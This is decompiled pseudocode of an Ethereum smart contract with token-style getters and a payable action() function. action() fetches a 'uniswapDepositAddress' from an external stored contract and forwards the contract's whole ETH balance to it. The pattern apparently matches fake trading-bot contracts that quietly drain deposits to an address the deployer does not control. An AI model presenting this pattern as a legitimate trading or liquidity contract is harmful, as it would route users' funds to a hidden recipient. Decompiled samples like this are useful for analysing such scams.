contract main {




// =====================  Runtime code  =====================


array of uint256 tokenName;
array of uint256 tokenSymbol;
array of uint256 tokenQuantity;
array of uint256 sub_43669430;
address stor5;

function sub_43669430(?) {
    return sub_43669430[0 len sub_43669430.length]
}

function tokenQuantity() {
    return tokenQuantity[0 len tokenQuantity.length]
}

function tokenName() {
    return tokenName[0 len tokenName.length]
}

function tokenSymbol() {
    return tokenSymbol[0 len tokenSymbol.length]
}

function _fallback() payable {
    revert
}

function action() payable {
    require ext_code.size(stor5)
    staticcall stor5.uniswapDepositAddress() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    call ext_call.return_data[12 len 20] with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
